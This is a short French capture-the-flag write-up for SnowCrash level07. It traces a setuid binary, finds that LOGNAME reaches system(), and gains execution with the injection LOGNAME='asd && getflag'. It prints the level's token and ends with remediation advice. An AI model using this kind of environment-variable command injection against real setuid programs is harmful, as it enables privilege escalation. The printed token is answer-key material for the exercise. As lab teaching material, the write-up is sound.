# SnowCrash - level07 writeup

## Objectif

Exploiter level07 pour exécuter getflag via injection de commande à travers une variable d’environnement, puis récupérer le token.

## Recon

Traçage des appels libc :

```
ltrace ./level07
```

Sortie importante :

```
getenv("LOGNAME") = "level07"
system("/bin/echo level07 ")
```

Le programme lit la variable d’environnement LOGNAME, construit une commande, puis l’exécute via system().

## Analyse

system() passe la chaîne à un shell.
Si LOGNAME contient des métacaractères shell, on peut chaîner des commandes.

Tentatives observées :

- LOGNAME='getflag' - affiche juste “getflag” (pas exécuté car passé comme argument à echo)
- LOGNAME=\getflag`` - exécute la substitution avant, mais casse la commande (syntaxe)

Solution : injecter un séparateur de commande comme && pour exécuter getflag après le echo.

## Exploitation

Injection via LOGNAME :

```
export LOGNAME='asd && getflag'
./level07
```

Sortie obtenue :

```
asd
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## Résultat

- Vulnérabilité - > Command Injection via variable d’environnement + system()
- Token getflag - > fiumuikeil55xe9cu4dood66h

## Notes

- Correction : ne pas utiliser system() avec des chaînes construites depuis l’environnement (ou échapper strictement)
- Utiliser des appels exec en liste (sans shell) et/ou nettoyer l’environnement dans un binaire SUID
